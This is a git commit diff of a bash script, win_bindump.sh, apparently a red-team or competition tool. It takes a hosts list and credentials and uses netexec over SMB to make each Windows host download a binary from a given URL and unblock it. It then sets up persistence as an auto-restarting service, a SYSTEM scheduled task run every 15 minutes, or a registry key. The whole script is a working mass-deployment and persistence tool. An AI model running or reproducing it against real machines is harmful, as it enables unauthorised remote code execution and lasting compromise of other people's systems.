213eb4464b6273b83f755ef08f696be58b59d20a
Indigo-10 <80222231+Indigo-10@users.noreply.github.com>
2025-02-10 15:41:50 -0500

    Update win_bindump.sh

--- win_bindump.sh
+++ win_bindump.sh
@@ -3,8 +3,7 @@
 # Download hosts file
 curl https://raw.githubusercontent.com/CyberLions/fortnite-the-video-game-parenthesis-the-town-parenthesis/main/hosts/windows.txt -o windowsHosts.txt
 
-deploy()
-{
+deploy() {
     read -p "Where is the binary stored: " binary
     echo "Is the folder where you want to store the binary already on the filesystem"
     echo "1. Yes"
@@ -17,64 +16,75 @@ deploy()
         2)
             execute "true" "$binary"
             ;;
+        *)
+            echo "Invalid option"
+            return 1
+            ;;
     esac
-
 }
 
-execute()
-{
+execute() {
     local createFolder=$1
     local binary=$2
-    read -p "What user are you signing in as: " userName
-    read -p "User password: " userPass
-    read -p "Where do you want to drop the binary: " binPath
-    read -p "What do you want to name the binary: " binName
+    read -rp "What user are you signing in as: " userName
+    read -rp "User password: " userPass
+    read -rp "Where do you want to drop the binary: " binPath
+    read -rp "What do you want to name the binary: " binName
+
     fullPath="$binPath\\$binName"
+            
     echo "Persistence Methods: " 
     echo "1. Service"
     echo "2. Scheduled Task"
     echo "3. Registry Key"
-    read -p "Which persistence method do you want to use: " persistMethod
+    read -rp "Which persistence method do you want to use: " persistMethod
+    
     case $persistMethod in 
         1)
-            read -p "What do you want to name the service: " serviceName
-            read -p "What description do you want to use for the service: " serviceDescription
-            persist="New-Service -Name '$serviceName' -BinaryPathName '$fullPath' -DisplayName '$serviceName' -Description '$serviceDescription' -StartupType Automatic; 
-            Start-Service -Name '$serviceName';"
+            read -rp "What do you want to name the service: " serviceName
+            read -rp "What description do you want to use for the service: " serviceDescription
+            # Modified service creation to handle non-service binaries
+            persist="sc.exe create '$serviceName' binPath= '$fullPath' type= own start= auto displayname= '$serviceName'; sc.exe description '$serviceName' '$serviceDescription'; sc.exe failure '$serviceName' reset= 0 actions= restart/0/restart/0/restart/0; Start-Sleep -Seconds 2; sc.exe start '$serviceName'; if(\$?) { Write-Host 'Service started' } else { Write-Host 'Start attempted' }"
             ;;
         2)
-            read -p "What do you want to name the scheduled task: " taskName
-            read -p "What description do you want to set for the task: " taskDescription
-            persist="schtasks /create /sc minute /mo 15 /tn '$taskName' /tr '$fullPath' /ru 'SYSTEM'; 
-            schtasks /change /tn '$taskName' /description '$taskDescription'"
+            read -rp "What do you want to name the scheduled task: " taskName
+            read -rp "What description do you want to set for the task: " taskDescription
+            persist="schtasks /create /sc minute /mo 15 /tn \"$taskName\" /tr \"$fullPath\" /ru \"SYSTEM\" /f ; schtasks /change /tn \"$taskName\" /description \"$taskDescription\""
             ;;
         3) 
-            read -p "Registry Path?: " regPath
-            read -p "Registry Key?: " regKey
+            read -rp "Registry Path?: " regPath
+            read -rp "Registry Key?: " regKey
             echo "Do you want to preserve any key values that may exist within the path?: "
             echo "1. Yes"
             echo "2. No"
-            read -p "Yes or No: " preserveKeys
+            read -rp "Yes or No: " preserveKeys
             case $preserveKeys in 
                 1)
-                    read -p "Please enter the pre-existing key values, followed by a comma: " existingValue
+                    read -rp "Please enter the pre-existing key values: " existingValue
                     persist="reg add '$regPath' /v '$regKey' /d '$existingValue,$fullPath' /t reg_sz /f;" 
                     ;;
                 2)
                     persist="reg add '$regPath' /v '$regKey' /d '$fullPath' /t reg_sz /f;"
                     ;;
             esac
+            ;;
+        *)
+            echo "Invalid persistence method"
+            return 1
+            ;;
     esac
+
+    echo "Generated Command: $persist"
+
     
-    local command="Invoke-WebRequest -Uri '$binary' -OutFile '$fullPath'; $persist"
+    local command="Invoke-WebRequest -Uri '$binary' -OutFile '$fullPath'; Unblock-File -Path '$fullPath'; $persist"
     if [[ $createFolder == "true" ]]; then
         command="mkdir '$binPath'; $command"
     fi
-    netexec windowsHosts.txt -u "$userName" -p "$userPass" -X "$command"
+    netexec smb windowsHosts.txt -u "$userName" -p "$userPass" -X "$command"
 }
 
-main()
-{
+main() {
     deploy
 }
 
